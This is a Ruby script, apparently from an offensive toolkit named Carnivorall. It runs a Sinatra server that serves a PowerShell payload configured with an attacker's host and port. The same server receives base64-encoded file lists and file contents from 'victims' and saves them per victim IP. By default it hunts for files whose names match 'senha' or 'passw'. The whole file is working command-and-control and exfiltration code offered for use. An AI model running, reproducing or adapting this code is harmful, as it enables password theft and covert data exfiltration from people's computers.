#!/usr/bin/env ruby
#=========================================================================
# Title           :cec.rb
# Description     :Carnivorall module to send and receive victms requests
# Authors         :L0stControl
# Date            :2018/04/15
# Version         :0.1.1    
# Dependecies     :ruby gems - colorize / sinatra / ipaddr
#=========================================================================

require 'sinatra'
require 'colorize'
require 'ipaddr'
require 'fileutils'
require 'date'

lhost = ARGV[0]
file  = ARGV[1]
match = ARGV[2]
dstFolder = ARGV[3]
lport = ARGV[4]

banner = "\n Usage: LPORT=80 LHOST=192.168.1.1 FILE=/path/to/powershell.ps1 ./cec.rb"

set :dump_errors, false
set :raise_errors, false
set :logging, false
set :environment, :production
set :show_exceptions, false

if lhost != nil
    if (IPAddr.new(lhost) rescue nil).nil?
        puts banner
        puts " [Error] Invalid IP address format #{lhost}".red
        exit
    end
else
    puts " [Error] LHOST parameter is empty".red
    exit
end

set :bind, lhost

if lport != nil
    set :port, lport
else
    lport = "80"
    set :port, lport
end

if match == nil
    match = 'senha" -or $_.Name -match "passw'
else
    match = match.gsub(" ",'" -or $_.Name -match "')
end

if file == "notset"
    puts " [+]".green + " No Powershell payload defined, Listen Mode enable \n".white
else 
    begin 
        scriptFile = File.open(file, "r")
        payload = scriptFile.read.gsub!("LHOST",lhost).gsub!("LPORT",lport).gsub!("MATCH",match)
        scriptFile.close
    rescue 
    puts "[Error] File #{file} not found".red
    exit
    end
end

get "/:ps.ps1" do
    "#{payload}"
end

post "/content" do 
    resultFind = params[:filecontent].unpack('m*')[0]
    ipVictm = params[:ip].unpack('m*')[0]

    puts " \n#{ipVictm.gsub(/\s/, '').gsub(/\{/,"\n ").gsub(/}/, '')}".green
    puts " [+] List of files ".yellow
    resultFind.split(",").each do |lines|
       if lines.match(/File: /)
        puts " [+] ".green + "#{lines.split("\n")[0][18..-1]}".white
       end
    end
    puts " [+] End of files \n".yellow
end

put "/send" do 
    hostName = params[:hn].unpack('m*')[0]
    fileName = params[:fn].unpack('m*')[0]
    fileContent = params[:fc].gsub(/\s/,'+').unpack('m*')[0].unpack('a*')[0]

    puts "\n [+]".green + " File from IP...: #{request.ip} | Hostname...: #{hostName} ".white
    print "  Filename.......: #{fileName} "
    unless File.directory?("#{dstFolder}/#{request.ip}")
        FileUtils.mkdir_p("#{dstFolder}/#{request.ip}")
    end
    
    onlyFileName = fileName.split("\\").last

    if !fileName.empty? && !fileContent.empty?

        out_file = File.new("#{dstFolder}/#{request.ip}/#{DateTime.now.strftime('%Q')}.#{onlyFileName}", "w")
        out_file << fileContent
        out_file.close
        puts "[OK]\n".green
    else
        puts "[Error]\n".red
    end
end
